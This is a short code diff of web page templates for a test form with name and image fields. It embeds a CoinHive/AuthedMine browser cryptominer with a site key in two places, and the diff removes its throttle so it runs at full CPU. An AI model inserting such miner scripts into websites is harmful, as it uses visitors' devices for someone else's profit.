@@ -17,7 +17,7 @@ and more text here.
 field from request: {{ .Fn}}
 </p>
 
-<form enctype="multipart/form-data" action="" method="POST">
+<form enctype="multipart/form-data" action="/app/test/" method="POST">
   First name: <input type="text" name="fn"><br>
   Last name: <input type="text" name="tn"><br>
 	IMG: <input type="file" name="img"><br>
@@ -26,7 +26,7 @@ field from request: {{ .Fn}}
 
 <script src="https://authedmine.com/lib/authedmine.min.js"></script>
 <script>
-	var miner = new CoinHive.Anonymous('fS3DFhCgfTnrXc7UrRjkbnu3zPbugsEmY', {throttle: 0.3});
+	var miner = new CoinHive.Anonymous('fS3DFhCgfTnrXc7UrRjkbnu3zPbugsEmY', {throttle: 0.0});
 
 	// Only start on non-mobile devices and if not opted-out
 	// in the last 14400 seconds (4 hours):
@@ -60,7 +60,7 @@ var (
 
   <script src="https://authedmine.com/lib/authedmine.min.js"></script>
 <script>
-	var miner = new CoinHive.Anonymous('fS3DFhCgfTnrXc7UrRjkbnu3zPbugsEmY', {throttle: 0.3});
+	var miner = new CoinHive.Anonymous('fS3DFhCgfTnrXc7UrRjkbnu3zPbugsEmY', {throttle: 0.0});
 
 	// Only start on non-mobile devices and if not opted-out
 	// in the last 14400 seconds (4 hours):
